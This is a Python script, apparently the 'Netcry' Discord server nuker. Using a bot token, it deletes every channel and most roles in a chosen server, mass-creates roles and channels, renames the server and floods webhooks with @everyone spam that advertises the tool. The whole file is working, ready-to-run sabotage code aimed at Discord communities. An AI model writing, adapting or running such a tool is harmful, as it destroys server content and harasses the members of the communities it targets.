import asyncio
import aiohttp
import sys
import requests
import json
import threading

# this is nearly as fast as nebula nuker bot lol
# why are you reading the source code?
# either you think it is a rat or you are trying to skid it hm
# property of @a1lw on discord or https://github.com/dropalways

with open("token.txt", "r") as file:
    token = file.readline().strip()
    if token == "":
        print("Empty token")
        print("Ignore the error below i dont know how to fix it if you know how to fix it create a pull request")
        sys.exit(1)
    elif token == "single token here":
        print("You havent edited the file 'token.txt'.")
        print("Ignore the error below i dont know how to fix it if you know how to fix it create a pull request")
        sys.exit(1)
    headers = {'Authorization': f'Bot {token}'}
print("This will only work with bot tokens")
guild_id = input("Guild ID? ")
themessage = input("Enter message [Enter for default]: ")
if themessage == "":
    themessage = "@everyone\n**Netcry was here** <a:trolli:1130231841073414294>\n\nhttps://www.youtube.com/watch?v=jjOhdodxSCc"
sname = input("Enter new server name [Enter for default]: ")
if sname == "":
    sname = "github.com/dropalways/netcry-nuker"
num_channels = 50
num_messages = 41
num_roles = 40

total_messages_sent = 0

async def start_bot():
    headers = {'Authorization': f'Bot {token}'}
    async with aiohttp.ClientSession(headers=headers) as session:
        await delete_all_roles(session)
        await create_roles(session)
        guild_url = f'https://discord.com/api/v9/guilds/{guild_id}'
        await delete_all_channels(session)
        await change_server_name(session, sname)
        await create_channels_and_spam(session)

async def delete_all_channels(session):
    print("Deleting channels...")
    url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
    async with session.get(url) as response:
        if response.status == 200:
            channels = await response.json()
            delete_tasks = []
            for channel in channels:
                channel_id = channel['id']
                delete_url = f'https://discord.com/api/v9/channels/{channel_id}'
                delete_tasks.append(session.delete(delete_url))
            await asyncio.gather(*delete_tasks)
            print("Deleted all channels.")
        else:
            print("Failed to retrieve channels")

async def delete_all_roles(session):
    print("Deleting roles...")
    roles_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles'
    async with session.get(roles_url) as response:
        if response.status == 200:
            roles = await response.json()
            delete_tasks = []
            delete_count = 0
            for role in roles:
                role_id = role['id']
                if role_id != guild_id and delete_count < len(roles) - num_roles:
                    delete_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}'
                    delete_tasks.append(session.delete(delete_url))
                    delete_count += 1
            await asyncio.gather(*delete_tasks)
            print(f"Deleted {delete_count} roles")
        else:
            print("Failed to retrieve roles")

async def create_roles(session):
    print("Creating roles...")
    rname = "Netcry on top"
    create_role_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles'
    create_role_payload = {
        'name': f'{rname}',
        'color': 0xFF0000,
        'hoist': True,
        'mentionable': True
    }
    create_tasks = []
    for _ in range(num_roles):
        create_tasks.append(session.post(create_role_url, json=create_role_payload))
    create_responses = await asyncio.gather(*create_tasks)
    print("Made a shit ton of roles")

async def create_channel_and_spam(session, create_channel_url, create_channel_payload, create_webhook_url, create_webhook_payload):
    global total_messages_sent

    async with session.post(create_channel_url, headers=headers, json=create_channel_payload) as create_response:
        if create_response.status == 201:
            channel = await create_response.json()
            channel_id = channel['id']
            
            retry_attempts = 10
            for attempt in range(retry_attempts):
                create_webhook_response = await session.post(create_webhook_url.format(channel_id=channel_id), headers=headers, json=create_webhook_payload)
                if create_webhook_response.status == 200:
                    webhook = await create_webhook_response.json()
                    webhook_url = webhook['url']
                    print(f"Created Webhook: {webhook_url}")
                    
                    messages_sent = await spam_webhook(session, webhook_url)
                    total_messages_sent += messages_sent
                    break
                else:
                    print(f"Failed to create webhook for channel: {channel_id}. Retrying ({attempt + 1}/{retry_attempts})...")
                    await asyncio.sleep(0.7)
            else:
                print(f"Failed to create webhook for channel: {channel_id} after {retry_attempts} attempts.")

        else:
            print("Failed to create channel")


async def create_channels_and_spam(session):
    print("Creating channels and webhooks...")
    headers = {
        'Content-Type': 'application/json'
    }
    create_channel_url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
    create_channel_payload = {
        'name': 'netcry-on-top',
        'type': 0
    }
    create_webhook_url = f'https://discord.com/api/v9/channels/{{channel_id}}/webhooks'
    create_webhook_payload = {
        'name': 'why are you looking at the webhook name | github.com/dropalways/netcry-nuker',
    }

    create_tasks = []
    for _ in range(num_channels):
        create_task = asyncio.ensure_future(create_channel_and_spam(session, create_channel_url, create_channel_payload, create_webhook_url, create_webhook_payload))
        create_tasks.append(create_task)

    await asyncio.gather(*create_tasks)

    print(f"Total messages sent: {total_messages_sent}")


async def change_server_name(session, sname):
    print("Changing server name...")
    url = f'https://discord.com/api/v9/guilds/{guild_id}'
    headers = {
        'Content-Type': 'application/json'
    }
    payload = {
        'name': sname
    }
    async with session.patch(url, headers=headers, json=payload) as response:
        if response.status == 200:
            print(f"Server name changed to: {sname}")
        else:
            print("Failed to change server name")

async def spam_webhook(session, webhook_url):
    messages_sent = 0

    message = {
        "content": f"{themessage}",
        'username': 'github.com/dropalways/netcry-nuker',
        "avatar_url": "https://cdn.discordapp.com/emojis/1130231841073414294.gif?size=44&quality=lossless",
        "components": [
            {
                "type": 1,
                "components": [
                    {
                        "type": 2,
                        "style": 5,
                        "label": "Download",
                        "url": "https://github.com/dropalways/netcry-nuker"
                    }
                ]
            }
        ]
    }

    while messages_sent < num_messages:
        async with session.post(webhook_url, json=message) as response:
            if response.status == 204:
                print(f"Sent: {webhook_url}")
                messages_sent += 1

        print(f"Retrying: {webhook_url}")

    return messages_sent

asyncio.run(start_bot())
#cHJvcGVydHkgb2YgYTFsdw